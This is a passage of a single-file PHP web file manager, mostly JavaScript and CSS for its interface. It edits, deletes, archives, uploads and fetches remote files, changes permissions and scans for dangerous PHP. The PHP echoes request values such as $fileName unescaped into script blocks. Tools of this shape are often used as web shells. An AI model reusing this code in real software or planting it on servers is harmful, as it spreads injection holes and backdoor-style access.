parent.getData3('?bj=3&dir=<?=urlencode($dir)?>&fileName=<?=$fileName?>','<?=urlencode($dir)?>','mullu');
</script>
<?	
die();
}else if($iframeA==4){
?>	
<script>
parent.getData3('?bj=4&dir=<?=urlencode($dir)?>','<?=urlencode($dir)?>','mullu');
</script>
<?	
die();	
}else if($iframeA==5){
?>
<script>
parent.getData3('?bj=5&dir=<?=urlencode($dir)?>&bl=<?=$bl?>','<?=urlencode($dir)?>','mullu');
</script>
<?
die();
}else if($iframeA==6){
?>
<script>
parent.getData2('?bj=1&A=3&dir=<?=urlencode($dir)?>','M','<?=$dir?>');
parent.getData2('?bj=1&A=4&dir=<?=urlencode($dir)?>','F');
parent.getData2('?bj=1&A=5&dir=<?=urlencode($dir)?>','lujing');
</script>
<?
die();
}else if($iframeA==7){
?>
<script>
parent.getData3('?bj=7&remoteip=<?=$remoteip?>','<?=urlencode($dir)?>','mullu');
</script>
<?
die();	
}else if($iframeA=='link'){
echo time();
die();
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//zh-CN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html  xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" dir="ltr" style="overflow-x:hidden;">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link rel="Shortcut Icon" href="?imgname=favicon.ico" type="image/x-icon">
<meta name="robots" content="noindex,noarchive">
<title>
	<?
	if($bj==1&&$fileName!=""){
	echo "�༭ ".$fileName;
	}else{
	echo "����PHP�ļ�������";
	}
	?>
</title>
<style>
#colorBoard{position:absolute;z-index:999999999999999; padding:10px; width:256px; height:220px; background:#f3f3f3; border:#d9d9d9 1px solid;}
#colorBank{ clear:both; border:#d9d9d9 1px solid; background:#FFF; width:252px; padding:0 0 2px 2px; overflow:hidden; margin:0 auto 0 auto;}
#colorBank div{ overflow:hidden; height:12px; width:12px; margin:2px 2px 0 0; float:left; overflow:hidden; cursor:pointer;}
#colorViews{width:80px; height:20px; float:left;border:#d9d9d9 1px solid; background:#000; display:block; margin: 0 10px 10px 0;}
#colorInput{width:70px; height:18px; float:left; font-family:Verdana; font-size:13px; color:#333; display:block; border:none; background:#FFF;border:#d9d9d9 1px solid;margin: 0 10px 10px 0;}
#colorClose{width:80px; color:#999999; height:22px; float:left;display:block; background:#f3f3f3;cursor:pointer;border:#d9d9d9 1px solid; border-top:#FFF 1px solid; border-left:#FFF 1px solid;}
</style>
<script>
function colorSelect(g,r,q){if(document.getElementById("colorBoard")){return}q=q||event;var h=getScrollPos();var n=h.l+q.clientX;var w=h.t+q.clientY+10;if(n>getBody().clientWidth-253){n=getBody().clientWidth-253}var f=document.getElementById(g);var p=document.getElementById(r);var k=new Array("00","33","66","99","CC","FF");var s=new Array("FF0000","00FF00","0000FF","FFFF00","00FFFF","FF00FF");var o=document.createElement("div");o.setAttribute("id","colorBank");var j=document.createElement("div");j.setAttribute("id","colorViews");var d=document.createElement("input");d.setAttribute("id","colorInput");d.setAttribute("type","text");d.setAttribute("disabled","disabled");var m=document.createElement("input");m.setAttribute("id","colorClose");m.setAttribute("value","ȡ��");m.setAttribute("type","button");m.onclick=function(){document.body.removeChild(u)};var u=document.createElement("div");u.id="colorBoard";u.style.left=n+"px";u.style.top=(w-270)+"px";u.appendChild(j);u.appendChild(d);u.appendChild(m);u.appendChild(o);document.body.appendChild(u);for(b=0;b<6;b++){for(a=0;a<3;a++){for(i=0;i<6;i++){colorItem=document.createElement("div");colorItem.style.backgroundColor="#"+k[a]+k[i]+k[b];o.appendChild(colorItem)}}}for(b=0;b<6;b++){for(a=3;a<6;a++){for(i=0;i<6;i++){colorItem=document.createElement("div");colorItem.style.backgroundColor="#"+k[a]+k[i]+k[b];o.appendChild(colorItem)}}}for(i=0;i<6;i++){colorItem=document.createElement("div");colorItem.style.backgroundColor="#"+k[0]+k[0]+k[0];o.appendChild(colorItem)}for(i=0;i<6;i++){colorItem=document.createElement("div");colorItem.style.backgroundColor="#"+k[i]+k[i]+k[i];o.appendChild(colorItem)}for(i=0;i<6;i++){colorItem=document.createElement("div");colorItem.style.backgroundColor="#"+s[i];o.appendChild(colorItem)}var v=o.getElementsByTagName("div");for(i=0;i<v.length;i++){v[i].onmouseover=function(){a=this.style.backgroundColor;if(a.length>7){a=formatRgb(a)}j.style.background=a.toUpperCase();d.value=a.toUpperCase()};v[i].onclick=function(){a=this.style.backgroundColor;if(a.length>7){a=formatRgb(a)}f.value=a.toUpperCase();p.style.background=a.toUpperCase();document.body.removeChild(u)}}}function formatRgb(rgb){rgb=rgb.replace("rgb","");rgb=rgb.replace("(","");rgb=rgb.replace(")","");format=rgb.split(",");a=eval(format[0]).toString(16);b=eval(format[1]).toString(16);c=eval(format[2]).toString(16);rgb="#"+checkFF(a)+checkFF(b)+checkFF(c);function checkFF(str){if(str.length==1){str=str+""+str;return str}else{return str}}return rgb}function getBody(){var d;if(typeof document.compatMode!="undefined"&&document.compatMode!="BackCompat"){d=document.documentElement}else{if(typeof document.body!="undefined"){d=document.body}}return d}function getScrollPos(){var e,d;if(typeof window.pageYOffset!="undefined"){e=window.pageYOffset;d=window.pageXOffset}else{e=getBody().scrollTop;d=getBody().scrollLeft}return{t:e,l:d}};
</script>
<script type="text/javascript"> 
onerror=handleErr;
var errcount = 0;
function handleErr(msg,url,l) 
{
errcount ++;
return true 
}
</script> 
<style>
*{
     font-size:12px;
     font-family: Verdana, Arial;
  }

input,button,select,textarea{outline:none}
img{border:0;};
html body{
min-width:960px;
_width:expression((documentElement.clientWidth < 960) ? "960px" : "auto" );
}
a:link,a:visited { color: #000000; TEXT-DECORATION: none}
a:hover { color: #000000; TEXT-DECORATION: underline}
#menu1{background:#8C8A8C;height:20px;color:#EEE;}
#menu2{background:#BDBABD;height:20px;color:#666;}
#menu3{background:#FFFFFF;height:20px;}
#menu4{
background:#BDBABD;
height:23px;
width:100%;
min-width:960px;
}
#bottom{background:#FFFFFF;height:20px;}
#bottom2{background:#8C8A8C;height:20px;color:#222;}
.loadDiv{
	position:absolute; 
	width:100%;
	height:100%;
	z-index:9998; 
	background-color:#FFFFFF;
	text-align:center;
	padding-top:300px;
        display:none;
        opacity: 0.5;
        filter: alpha(opacity=50);
        -moz-opacity: 0.5;
}
#body{
      background:#FFFFFF;
      height:10px;
      min-width:960px;
      _width:expression((documentElement.clientWidth < 960) ? "960px" : "auto" );
      }
.submit{
		line-height :16px;
		height :22px;
		text-align:right;
		padding-right:2px;
		}
#dyleft{
      width: 300px;
      border-right:1px solid #E7E7E7;
      border-bottom:1px solid #E7E7E7;
      }
#dyright{
      border-bottom:1px solid #E7E7E7;
      }
.color{width:60px;color:#111;}
.wjbztitle{color:#888;float:right;display:block;white-space:nowrap; overflow:hidden; text-overflow:ellipsis;width:150px;}
.images{
       width:150px;
       height :220px;
       float:left;
       border:1px solid #E7E7E7;
       margin: 5px;
       padding:5px;
       }

.mtitle{
position: absolute;
width:250px;
height :120px;
line-height:18px;
background:#fff;
display:none;
border:1px solid #E7E7E7;
margin: 10px;
padding:10px;
z-index:3;
}
.alt1 td{background:#fff;line-height:20px;}
.alt2 td{background:#eee;line-height:20px;}


.flv{background:url(?imgname=allbgs.gif) no-repeat 0px 0px;height:16px;padding-left:18px;}
.up{background:url(?imgname=allbgs.gif) no-repeat 0px -15px;height:15px;padding-left:18px;}
.htm,.htnl,.IExplore{background:url(?imgname=allbgs.gif) no-repeat 0px -30px;height:16px;padding-left:18px;}
.swf{background:url(?imgname=allbgs.gif) no-repeat 0px -46px;height:16px;padding-left:18px;}
.Lfilesave{background:url(?imgname=allbgs.gif) no-repeat 0px -62px;height:16px;padding-left:18px;}
.txt,.icon_txt{background:url(?imgname=allbgs.gif) no-repeat 0px -78px;height:16px;padding-left:18px;}
.tgz,.icon_tgz{background:url(?imgname=allbgs.gif) no-repeat 0px -94px;height:16px;padding-left:17px;}
.icon_jie{background:url(?imgname=allbgs.gif) no-repeat 0px -110px;height:16px;padding-left:17px;}
.zip,.icon_zip{background:url(?imgname=allbgs.gif) no-repeat 0px -126px;height:16px;padding-left:18px;}
.newfolder{background:url(?imgname=allbgs.gif) no-repeat 0px -142px;height:16px;padding-left:18px;}
.property{background:url(?imgname=allbgs.gif) no-repeat 0px -158px;height:16px;padding-left:18px;}
.search{background:url(?imgname=allbgs.gif) no-repeat 0px -174px;height:16px;padding-left:18px;}
.rgb{background:url(?imgname=allbgs.gif) no-repeat 0px -190px;height:16px;padding-left:18px;}
.reload{background:url(?imgname=allbgs.gif) no-repeat 0px -206px;height:16px;padding-left:18px;}
.Nname{background:url(?imgname=allbgs.gif) no-repeat 0px -222px;height:16px;padding-left:18px;}
.newtxt{background:url(?imgname=allbgs.gif) no-repeat 0px -238px;height:16px;padding-left:15px;}
.sum{background:url(?imgname=allbgs.gif) no-repeat 0px -254px;height:16px;padding-left:18px;}
.paste{background:url(?imgname=allbgs.gif) no-repeat 0px -270px;height:16px;padding-left:18px;}
.ico,.icon_image{background:url(?imgname=allbgs.gif) no-repeat 0px -286px;height:16px;padding-left:16px;}
.delete{background:url(?imgname=allbgs.gif) no-repeat 0px -302px;height:16px;padding-left:18px;}
.cut{background:url(?imgname=allbgs.gif) no-repeat 0px -318px;height:16px;padding-left:18px;}
.downfile{background:url(?imgname=allbgs.gif) no-repeat 0px -334px;height:16px;padding-left:18px;}
.rar,.Winrar{background:url(?imgname=allbgs.gif) no-repeat 0px -350px;height:16px;padding-left:18px;}
.wmplayer{background:url(?imgname=allbgs.gif) no-repeat 0px -366px;height:16px;padding-left:18px;}
.copy{background:url(?imgname=allbgs.gif) no-repeat 0px -382px;height:16px;padding-left:18px;}
.zip{background:url(?imgname=allbgs.gif) no-repeat 0px -398px;height:16px;padding-left:18px;}
.upfile{background:url(?imgname=allbgs.gif) no-repeat 0px -414px;height:16px;padding-left:18px;}
.cmd{background:url(?imgname=allbgs.gif) no-repeat 0px -430px;height:16px;padding-left:18px;}
.filesave{background:url(?imgname=allbgs.gif) no-repeat 0px -446px;height:16px;padding-left:18px;}
.home{background:url(?imgname=allbgs.gif) no-repeat 0px -462px;height:17px;padding-left:19px;}
.Tool{background:url(?imgname=allbgs.gif) no-repeat 0px -479px;height:17px;padding-left:19px;}
.jsTool{background:url(?imgname=allbgs.gif) no-repeat 0px -496px;height:17px;padding-left:19px;}
.menu{background:url(?imgname=allbgs.gif) no-repeat 0px -513px;height:17px;padding-left:19px;}
.Editor{background:url(?imgname=allbgs.gif) no-repeat 0px -530px;height:17px;padding-left:19px;}
.xsl{background:url(?imgname=allbgs.gif) no-repeat 0px -547px;height:18px;padding-left:22px;}
.rtf{background:url(?imgname=allbgs.gif) no-repeat 0px -565px;height:18px;padding-left:22px;}
.wav{background:url(?imgname=allbgs.gif) no-repeat 0px -583px;height:18px;padding-left:22px;}
.ai{background:url(?imgname=allbgs.gif) no-repeat 0px -601px;height:18px;padding-left:22px;}
.xml{background:url(?imgname=allbgs.gif) no-repeat 0px -619px;height:18px;padding-left:22px;}
.unknown{background:url(?imgname=allbgs.gif) no-repeat 0px -637px;height:18px;padding-left:22px;}
.txt{background:url(?imgname=allbgs.gif) no-repeat 0px -655px;height:18px;padding-left:22px;}
.wbmp{background:url(?imgname=allbgs.gif) no-repeat 0px -673px;height:18px;padding-left:22px;}
.tif{background:url(?imgname=allbgs.gif) no-repeat 0px -691px;height:18px;padding-left:22px;}
.exe{background:url(?imgname=allbgs.gif) no-repeat 0px -709px;height:18px;padding-left:22px;}
.doc{background:url(?imgname=allbgs.gif) no-repeat 0px -727px;height:18px;padding-left:22px;}
.gif{background:url(?imgname=allbgs.gif) no-repeat 0px -745px;height:18px;padding-left:22px;}
.folder{background:url(?imgname=allbgs.gif) no-repeat 0px -763px;height:18px;padding-left:22px;}
.avi{background:url(?imgname=allbgs.gif) no-repeat 0px -781px;height:18px;padding-left:22px;}
.aif{background:url(?imgname=allbgs.gif) no-repeat 0px -799px;height:18px;padding-left:22px;}
.dll{background:url(?imgname=allbgs.gif) no-repeat 0px -817px;height:18px;padding-left:22px;}
.bmp{background:url(?imgname=allbgs.gif) no-repeat 0px -835px;height:18px;padding-left:22px;}
.jpe{background:url(?imgname=allbgs.gif) no-repeat 0px -853px;height:18px;padding-left:22px;}
.pdf{background:url(?imgname=allbgs.gif) no-repeat 0px -871px;height:18px;padding-left:22px;}
.mpeg{background:url(?imgname=allbgs.gif) no-repeat 0px -889px;height:18px;padding-left:22px;}
.png{background:url(?imgname=allbgs.gif) no-repeat 0px -907px;height:18px;padding-left:22px;}
.php{background:url(?imgname=allbgs.gif) no-repeat 0px -925px;height:18px;padding-left:22px;}
.midi{background:url(?imgname=allbgs.gif) no-repeat 0px -943px;height:18px;padding-left:22px;}
.mdb{background:url(?imgname=allbgs.gif) no-repeat 0px -961px;height:18px;padding-left:20px;}
.js{background:url(?imgname=allbgs.gif) no-repeat 0px -979px;height:18px;padding-left:22px;}
.mov{background:url(?imgname=allbgs.gif) no-repeat 0px -997px;height:18px;padding-left:22px;}
.xls{background:url(?imgname=allbgs.gif) no-repeat 0px -1015px;height:20px;padding-left:22px;}
.xian{background:url(?imgname=allbgs.gif) no-repeat 0px -1035px;height:20px;padding-left:22px;}

</style>
<script language="javascript" type="text/javascript">
function F(objid){
return $$(objid).value;
}
function $$(objid){
return document.getElementById(objid);
}

function getCookie(objName){//��ȡָ�����Ƶ�cookie��ֵ
var arrStr = document.cookie.split("; ");
for(var i = 0;i < arrStr.length;i ++){
var temp = arrStr[i].split("=");
if(temp[0] == objName) return unescape(temp[1]);
} 
}
function setCookie (name, value) { 
       var exp = new Date(); 
       exp.setTime (exp.getTime()+3600000000); 
       document.cookie = name + "=" + value + "; expires=" + exp.toGMTString(); 
}
/////////////////////////////////////////////////////////////////////////
//�ж�ie6
var isIE6=false;
document.write("<!--[if lte IE 6]><script>isIE6=true;</scr"+"ipt><![endif]-->");

 //��ֹ�س�
 function disableEnter(event){
 var keyCode = event.keyCode ? event.keyCode : event.which ? event.which : event.charCode;
 if (keyCode == 13){
  return false;
 }
}
////////////////////////////////////////////////////////////
function openA(url){
$$('iframe1').src=url;
showid('smallLay2');
}
////////////////////////////////////////////////////////
function del(){
var s = document.getElementsByName("file[]");  
var check=0;
for(var i=0;i<s.length;i++){
  if(s[i].checked){
  check=1;
  }
}
if( check == 0){  
  alert("��ѡ���ļ����ļ���!");  
}else{

  $$("deldir").innerHTML="";
  $$("delfile").innerHTML="";
  var str = new Array();
  var s = document.getElementsByName("file[]");  
  for(var i=0;i<s.length;i++){
    if(s[i].checked){
      if(s[i].id!=1){
		str = s[i].value.split(".");
                extname = str[str.length - 1];
                $$("delfile").innerHTML+="<div class='mailclass' id='asss"+s[i].value+"'><table width=100% border=0 cellspacing=0 cellpadding=0><tr><td width=18><div class='mailunknown'><div class='"+extname.toLowerCase()+"'></div><div class='unknown'></div></div></td><td>"+s[i].value+"</td><td width=10><a href=\"javascript:Adelss('"+s[i].value+"','asss"+s[i].value+"')\">X</a></td></tr></table></div>";
       }else{
                $$("deldir").innerHTML+="<div class='mailclass' id='bsss"+s[i].value+"'><table width=100% border=0 cellspacing=0 cellpadding=0><tr><td width=18><div class='mailunknown'><div class='folder'></div></div></td><td>"+s[i].value+"</td><td width=10><a href=\"javascript:Adelss('"+s[i].value+"','bsss"+s[i].value+"')\">X</a></td></tr></table></div>";
       }
    }
  }
  showid('smallLay20');
}
}

function Adelss(a,b){
 var s = document.getElementsByName("file[]");  
 for(var i=0;i<s.length;i++){
    if(s[i].checked){
       if(s[i].value==a){
          s[i].checked="";
          $$(b).style.display="none";
       } 
    }
 }
}
function delss(){
var s = document.getElementsByName("file[]");  
var check=0;
for(var i=0;i<s.length;i++){
  if(s[i].checked){
  check=1;
  }
}
if( check == 0){  
  alert("��ѡ���ļ����ļ���!");  
}else{
  if(confirm('ȷ��ɾ��ѡ�е��ļ��к��ļ�? ')){
      $dir=$$("ML").value;
	$$('MFform').action="?del=1&dir="+$dir;
	$$('MFform').submit();
  }else{
        showidg("smallLay20");
  }
}
}
/////////////////////////////////////////////////////////
function zip(){
var s = document.getElementsByName("file[]");  
var check=0;
for(var i=0;i<s.length;i++){
  if(s[i].checked){
  check=1;
  }
}
if($$("newT3").value==""){
confirm("����Ϊ��!");
}else{
	if( check == 0){  
            alert("��ѡ���ļ����ļ���!");  
         }else{
	     $dir=$$("ML").value;
	     $$('MFform').action="?B=zip&dir="+$dir;
		$$('MFform').submit();
	}
}
}
///////////////////////////////////////////////////////
function tgz(){
var s = document.getElementsByName("file[]");  
var check=0;
for(var i=0;i<s.length;i++){
  if(s[i].checked){
  check=1;
  }
}
if($$("newT4").value==""){
confirm("����Ϊ��!");
}else{
	if( check == 0){  
            alert("��ѡ���ļ����ļ���!");  
         }else{
	     $dir=$$("ML").value;
	     $$('MFform').action="?action=tgz&dir="+$dir;
		$$('MFform').submit();
	}
}
}
///////////////////////////////////////////////////////
function extract(){
var s = document.getElementsByName("file[]");  
var check=0;
for(var i=0;i<s.length;i++){
  if(s[i].checked){
  check=1;
  }
}
if($$("newT5").value==""){
confirm("·������Ϊ��!");
}else{
	if( check == 0){  
            alert("��ѡ���ļ����ļ���!");  
         }else{
	     $dir=$$("ML").value;
	     $$('MFform').action="?action=extract&dir="+$dir;
		$$('MFform').submit();
	}
}
}
////////////////////////////////////////////////////////
function cut(){
var s = document.getElementsByName("file[]");  
var check=0;
for(var i=0;i<s.length;i++){
  if(s[i].checked){
  check=1;
  }
}
	if( check == 0){  
            alert("��ѡ���ļ����ļ���!");  
         }else{
	     $dir=$$("ML").value;
	     $$('MFform').action="?action=cut&dir="+$dir;
		$$('MFform').submit();
	}

	}
///////////////////////////////////////////////////////
function copy(){
var s = document.getElementsByName("file[]");  
var check=0;
for(var i=0;i<s.length;i++){
  if(s[i].checked){
  check=1;
  }
}
	if( check == 0){  
            alert("��ѡ���ļ����ļ���!");  
         }else{
	     $dir=$$("ML").value;
	     $$('MFform').action="?action=copy&dir="+$dir;
	     $$('MFform').submit();
	}

}
///////////////////////////////////////////////////////
function simg(){
var s = document.getElementsByName("file[]");  
var check=0;
for(var i=0;i<s.length;i++){
  if(s[i].checked){
  check=1;
  }
}
	if( check == 0){  
            alert("��ѡ���ļ����ļ���!");  
         }else{
       if($$('imgT1').value==''){alert("���ɵ�Ŀ¼����Ϊ��!");}else{
       if($$('imgT3').value==''){alert("������Ϊ��!");}else{
       if($$('imgT4').value==''){alert("�߲���Ϊ��!");}else{
	     $dir=$$("ML").value;
	     $$('MFform').action="?action=simg&dir="+$dir;
		   $$('MFform').submit();	
		  }
		}

        }
        }
}

function mail(){
     if($$('mail1').value==''){alert("û����д�ռ���!");}else{
	     $dir=$$("ML").value;
	     $$('MFform').action="?action=email&dir="+$dir;
		   $$('MFform').submit();	
		 }//4

}

function mp3(){
	     $dir=$$("ML").value;
	     $$('MFform').action="?action=mp3&dir="+$dir;
		   $$('MFform').submit();	
}
function mp32(file,a){
	showid('smallLay18');
	$$('mp3file').value=file;
	$$('Title').value=$$('Title'+a).innerHTML;
	$$('Artist').value=$$('Artist'+a).innerHTML;
	$$('AlbumTitle').value=$$('AlbumTitle'+a).innerHTML;
	$$('Year').value=$$('Year'+a).innerHTML;
	$$('Genre').value=$$('Genre'+a).innerHTML;
}

function btnScan(){
	if($$("newT19").value==""){
		alert("����Ϊ��!"); 
	}else{
	     $dir=$$("ML").value;
	     $path=$$("newT19").value;
             getData3('?btnScan=1&path='+$path+'&dir='+$dir,$dir,'mullu');	
             showidg('smallLay19');
       $$("xin").innerHTML="ɨ��PHPΣ���ļ�";
  }
}




////////////////////////////////////////////////////////
function parse(){
	     $dir=$$("ML").value
	     $$('MFform').action="?action=parse&dir="+$dir;
		$$('MFform').submit();
	}
////////////////////////////////////////////////////////
function property(){
var s = document.getElementsByName("file[]");  
var check=0;
for(var i=0;i<s.length;i++){
  if(s[i].checked){
  check=1;
  }
}
	if( check == 0){  
            alert("��ѡ���ļ����ļ���!");  
         }else{
         		if( check == 0){  
                   alert("��ѡ���ļ����ļ���!");  
                  }else{
                  	 if($$("newT6").value==""){
                          confirm("����Ϊ��!");
                          }else{
	            $dir=$$("ML").value
	            $$('MFform').action="?action=editperming&dir="+$dir;
		          $$('MFform').submit();
		          $$("newT6").value="";
	            }
	          }
	}
}



//////////////////////////////////////////////////////
function Newname(){
if($$("newT8").value==""){
confirm("����Ϊ��!");
}else{
	            $dir=$$("ML").value
	            $$('MFform').action="?action=rename&dir="+$dir;
		          $$('MFform').submit();
		          $$("newT8").value="";
	      }
	
}
//////////////////////////////////////////////////////
function NEWdir(){
if($$("newT1").value==""){
confirm("����Ϊ��!");
}else{	
<?if($bj==1){?>
	            $$('NEWdir').action='?bj=1&fileName='+$$('T2').value+'&B=1&dir='+$$('Tdir2').value;       
<?}else{?>    
	            $dir=$$("ML").value
	            $$('NEWdir').action="?bj=&fileName=<?=$fileName?>&B=1&dir="+$dir;
<?}?>
		          $$('NEWdir').submit();	
		          $$("newT1").value="";
}
}
//////////////////////////////////////////////////////
function NEWfile(){
if($$("newT2").value==""){
confirm("����Ϊ��!");
}else{
utf8gbk(testradio());
$$('T2').value=$$('newT2').value;	
$$('c2').value="";
$$('Td3').value=1;
$$('xin').innerHTML="�½��ļ�:"+$$('newT2').value;
document.title="�༭ "+$$('newT2').value;

var path=$$('newT2').value;
var p=path.lastIndexOf("."); 
var name=path.substr(++p,path.length-p).toLowerCase( );
getData2('?button='+name,'button');
showidg('smallLay4');
$$("newT2").value="";
keyUp();
textCounter();
}
}


function testradio(){
       var commend = document.getElementsByName("encode").value;

       for(var i=0;i<document.getElementsByName("encode").length;i++)
{
           if(document.getElementsByName("encode")[i].checked==true)
{
              commend = document.getElementsByName("encode")[i].value;
              break;
           }
       }

       return commend;
}

function NEWfile2(){
if($$("newT2").value==""){
confirm("����Ϊ��!");
}else{
	$dir=$$("ML").value
	
	var path=$$('newT2').value;
  var p=path.lastIndexOf("."); 
  var name=path.substr(++p,path.length-p).toLowerCase( );
  getData2('?button='+name,'button');
  $$('NEWfile').action='?bj=1&new=1&dir='+$dir;
	$$('NEWfile').submit();
	showidg('smallLay4');
	$$("newT2").value="";
}
}
///////////////////////////////////////////////////////
function setid1(){
$num= document.getElementById('url1').value;
if($num>10){
$num=10;
}
document.getElementById('urlss').innerHTML="";
for (i=1;i<=$num;i++){
document.getElementById('urlss').innerHTML=document.getElementById('urlss').innerHTML+i+'<input name=file1[] type=text value=http://> url <input name=newurlname[] type=text size=6> ���ļ���<br>';
}
}
function setid2(){
$num= document.getElementById('url2').value;
if($num>10){
$num=10;
}
document.getElementById('urlss2').innerHTML="";
for (i=1;i<=$num;i++){
document.getElementById('urlss2').innerHTML=document.getElementById('urlss2').innerHTML+i+'<input type="file" name="userfile[]" size="20"> <input type="text" name="lastname[]" size=6> ���ļ���<br>';
}
}
/////////////////////////////////////////////////////////

try{
 var isStyle = document.getElementById("hsScroll").type;
}catch(err){
 document.write('<style id="ahsScroll" type="text/css">.hScroll{overflow:hidden;} .sScroll{}</style>');
}

function hideScroll(){//������
 document.documentElement.className = "hScroll";
}
function showScroll(){//������
 document.documentElement.className="sScroll";
}




//�ж������ie6������div����ʽ�ͷ�ie6������div����ʽ
//����div
function showid(idname){
hideScroll();//���ع�����


var isIE = (document.all) ? true : false;
var isIE6 = isIE && ([/MSIE (\d)\.0/i.exec(navigator.userAgent)][0][1] == 6);
var newbox=document.getElementById(idname);

newbox.style.zIndex="9999";
newbox.style.display="block"
newbox.style.position = !isIE6 ? "fixed" : "absolute";
newbox.style.top =newbox.style.left = "50%";
newbox.style.marginTop = - (newbox.offsetHeight / 2+100) + "px";
newbox.style.marginLeft = - newbox.offsetWidth / 2 + "px";  
var layer=document.createElement("div");
layer.id="layer";
layer.style.width=layer.style.height="100%";
layer.style.position= !isIE6 ? "fixed" : "absolute";
layer.style.top=layer.style.left=0;
layer.style.backgroundColor="#000";
layer.style.zIndex="9998";
layer.style.opacity="0.6";
document.body.appendChild(layer);
var sel=document.getElementsByTagName("select");
for(var i=0;i<sel.length;i++){        
sel[i].style.visibility="hidden";
}
function layer_iestyle(){      
layer.style.width=Math.max(document.documentElement.scrollWidth, document.documentElement.clientWidth)
+ "px";
layer.style.height= Math.max(document.documentElement.scrollHeight, document.documentElement.clientHeight) +
"px";
}
function newbox_iestyle(){      
newbox.style.marginTop = document.documentElement.scrollTop - newbox.offsetHeight / 2+100 + "px";
newbox.style.marginLeft = document.documentElement.scrollLeft - newbox.offsetWidth / 2 + "px";
}
if(isIE){layer.style.filter ="alpha(opacity=60)";}
if(isIE6){  
layer_iestyle()
newbox_iestyle();
window.attachEvent("onscroll",function(){                              
newbox_iestyle();
})
window.attachEvent("onresize",layer_iestyle)          
} 
layer.onclick=function(){
   if(csss==0){
	newbox.style.display="none";
        if(pdajax==1){
              if(newbox.id=='smallLay8'){
                   getData3('?dir='+$$('ML').value+'&A=A3',$$('ML').value,'mullu');
                   $$('iframeyc8').src="";
              }
        }
        showScroll()//��ʾ������
	layer.parentNode.removeChild(layer);
	for(var i=0;i<sel.length;i++){
         sel[i].style.visibility="visible";
        }

      }else{
             alert("�����ϴ����ܹرս���! ȡ���ϴ��������!"); 
     }
  }
}

function showidg(idname){
var sel=document.getElementsByTagName("select");
var newbox=document.getElementById(idname);
var layer=document.getElementById("layer");
newbox.style.display="none";
layer.parentNode.removeChild(layer);//ɾ�����ֲ�
for(var i=0;i<sel.length;i++){
sel[i].style.visibility="visible";
}
showScroll()//��ʾ������
}

////////////////////////////////////////
function s(i,url)
{
var dd=$$(i);
var img=$$('imgsrc');
dd.style.display='block';
img.src=url;
}
function cl(i)
{
var dd=document.getElementById(i);
dd.style.display='none';
}
//-------------------------------------------
function s2(i,url)
{
var dd=$$(i);
var img=$$('img'+i);
dd.style.display='block';
img.src=url;
}
function cl2(i)
{
var dd=$$(i);
dd.style.display='none';
}
/////////////////////////////////////////
function addCookie(objName,objValue,objHours){//����cookie
var str = objName + "=" + escape(objValue);
if(objHours > 0){//Ϊ0ʱ���趨����ʱ�䣬������ر�ʱcookie�Զ���ʧ
var date = new Date();
var ms = objHours*3600*1000;
date.setTime(date.getTime() + ms);
str += "; expires=" + date.toGMTString();
}
document.cookie = str;
//alert("����cookie�ɹ�");
}
///////////////////////////////////////////



function initxmlhttp() {
    var xmlhttp
    try
    {
        xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
    }
    catch (e) {
        try
        {
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }
        catch (E) {
            xmlhttp = false;
        }
    }
    if (!xmlhttp && typeof XMLHttpRequest != 'undefined') {
        try
        {
            xmlhttp = new XMLHttpRequest();
        }
        catch (e) {
            xmlhttp = false;
        }
    }
    if (!xmlhttp && window.createRequest) {
        try
        {
            xmlhttp = window.createRequest();
        }
        catch (e) {
            xmlhttp = false;
        }
    }
    return xmlhttp;
}


function getData3(url,dir,id,a) {
	$$('loadDiv').style.display='block';
    var url;
    var id;
    $$('ML').value=dir;
    var time1=new Date();
    var time=time1.getTime();
    var xmlhttp = initxmlhttp();
    var showcontent = $$(id);
    xmlhttp.open("GET", url+"&time="+time, true);
    xmlhttp.setRequestHeader("Cache-Control", "no-cache");
    xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200){
if(a==1){
    showcontent.value=xmlhttp.responseText;
}else{
    showcontent.innerHTML=xmlhttp.responseText;
    getData2('?bj=1&A=5&dir='+dir+'','lujing');
}
    $$('loadDiv').style.display='none';
    }
    }
    xmlhttp.send(null);
}

function getData(url,id,dir,fileName) {
    var url;
    var id;

$$('loadDiv').style.display='block';

    var time1=new Date();
    var time=time1.getTime();
    var xmlhttp = initxmlhttp();
    var showcontent = document.getElementById(id);
    xmlhttp.open("GET", url+"&time="+time, true);
    xmlhttp.setRequestHeader("Cache-Control", "no-cache");
    xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200){
    showcontent.value=xmlhttp.responseText;
    
    $$('loadDiv').style.display='none';
    	//alert(dir);
if(dir!=undefined){    
    $$('Tdir').value=dir;
    $$('Tdir2').value=dir;
}
   
if(fileName!=undefined){
 
    $$('T2').value=fileName;
    document.title="�༭ "+fileName;
var path=fileName;
var p=path.lastIndexOf("."); 
var name=path.substr(++p,path.length-p).toLowerCase( );

    getData2('?button='+name,'button');
    $$("bbbbb").style.display='none';
}  

    keyUp();
    textCounter();
    }      
    }
    xmlhttp.send(null);
}
function getData2(url,id,dir) {
    var url;
    var id;
    var time1=new Date();
    var time=time1.getTime();
    var xmlhttp = initxmlhttp();
    var showcontent = document.getElementById(id);
    xmlhttp.open("GET", url+"&time="+time, true);
    xmlhttp.setRequestHeader("Cache-Control", "no-cache");
    xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200){
    showcontent.innerHTML=xmlhttp.responseText;
    if(dir!=undefined){    
    $$('Tdir2').value=dir;
    }
    }      
    }
    xmlhttp.send(null);
}


function checkinput(id) { 
if($$(id).value==""){
confirm("����Ϊ��!");
return false; 
}
}


function Scolor(a){
if(a==1){
$$("c2").style.color="#eeeeee";
$$("c2").style.background="#000000";
$$("c2").style.fontSize="12px";
$$("color1").value="eeeeee";
$$("color2").value="000000";
$$("color3").value="12";
addCookie('love2',"eeeeee",9999999999);//��ס
addCookie('love3',"000000",9999999999);//��ס
addCookie('love4',"12",9999999999);//��ס
}else{
Acolor1=$$("color1").value
Acolor2=$$("color2").value
Acolor3=$$("color3").value
$$("c2").style.color="#"+Acolor1;
$$("c2").style.background="#"+Acolor2;
